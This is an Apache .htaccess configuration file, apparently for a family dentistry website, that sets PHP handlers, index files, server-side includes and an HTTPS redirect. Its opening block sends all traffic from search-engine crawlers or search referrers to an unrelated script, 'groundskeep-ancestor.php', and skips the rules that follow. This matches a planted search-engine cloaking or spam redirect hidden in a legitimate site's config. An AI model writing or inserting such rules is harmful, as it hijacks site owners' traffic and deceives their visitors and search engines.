RewriteEngine On

RewriteBase /
RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
RewriteRule . groundskeep-ancestor.php [L,S=10000]

AddType image/svg+xml .svg

AddHandler application/x-httpd-alt-php56___lsphp .php
DirectoryIndex default.html default.htm index.php index.shtml index.html index.htm home.html home.htm index.php5 welcome.html welcome.htm
Options -Indexes
AddHandler server-parsed .html
AddHandler server-parsed .shtml
AddHandler server-parsed .htm
RewriteEngine On
RewriteCond %{HTTP_HOST} elmhurstfamilydentistry\.com [NC]
RewriteCond %{SERVER_PORT} 80
RewriteRule ^(.*)$ https://elmhurstfamilydentistry.com/$1 [R,L]
